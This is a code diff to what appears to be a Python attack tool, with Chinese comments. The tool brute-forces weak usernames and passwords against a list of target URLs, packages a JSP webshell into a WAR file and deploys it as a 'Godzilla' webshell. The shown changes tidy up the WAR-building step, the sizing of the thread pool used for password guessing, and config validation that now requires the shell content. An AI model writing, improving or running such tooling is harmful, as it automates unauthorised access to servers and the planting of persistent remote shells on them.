@@ -49,16 +49,15 @@ def generate_war(config):
 
     try:
         # 创建临时 JSP 文件
-        temp_jsp_path = shell_file_name
-        with open(temp_jsp_path, 'w', encoding='utf-8') as jsp_file:
+        with open(shell_file_name, 'w', encoding='utf-8') as jsp_file:
             jsp_file.write(shell_content)
 
         # 生成 WAR 包
         with zipfile.ZipFile(war_file_name, 'w', zipfile.ZIP_DEFLATED) as war:
-            war.write(temp_jsp_path, shell_file_name)
+            war.write(shell_file_name, shell_file_name)
 
         # 删除临时 JSP 文件
-        os.remove(temp_jsp_path)
+        os.remove(shell_file_name)
 
         logger.info(f"[+] WAR 包生成成功: {war_file_name}，JSP 文件名: {shell_file_name}")
         return war_file_name, random_string, shell_file_name
@@ -187,20 +186,21 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries, ret
 
 # 动态调整线程池大小，确保资源使用合理
 def adjust_thread_pool_size(combination_count, max_workers_limit, min_workers, combination_per_thread):
-    # 根据用户配置的每多少个组合分配一个线程
-    calculated_workers = (combination_count + combination_per_thread - 1) // combination_per_thread  # 向上取整
+    if combination_count <= 0:
+        return min_workers
+    # 根据用户配置的每多少个组合分配一个线程，并确保至少有min_workers个线程
+    calculated_workers = max((combination_count + combination_per_thread - 1) // combination_per_thread,min_workers)
 
-    # 保证线程数不低于min_workers，不超过max_workers_limit
-    workers = min(max(min_workers, calculated_workers), max_workers_limit)
-
+    # 保证线程数不超过max_workers_limit
+    workers = min(calculated_workers, max_workers_limit)
     logger.info(f"根据用户名和密码组合总数 {combination_count} 调整线程池大小为 {workers}")
     return workers
 
 def validate_config(config):
     required_fields = {
-        'files': ['url_file', 'user_file', 'passwd_file', 'output_file'],
+        'files': ['url_file', 'user_file', 'passwd_file', 'output_file', 'shell_file_content'],
         'retry': ['check_weak_password', 'deploy_godzilla_war'],
-        'thread_pool': ['max_workers_limit', 'min_workers']
+        'thread_pool': ['max_workers_limit', 'min_workers', 'combination_per_thread']
     }
 
     for section, fields in required_fields.items():
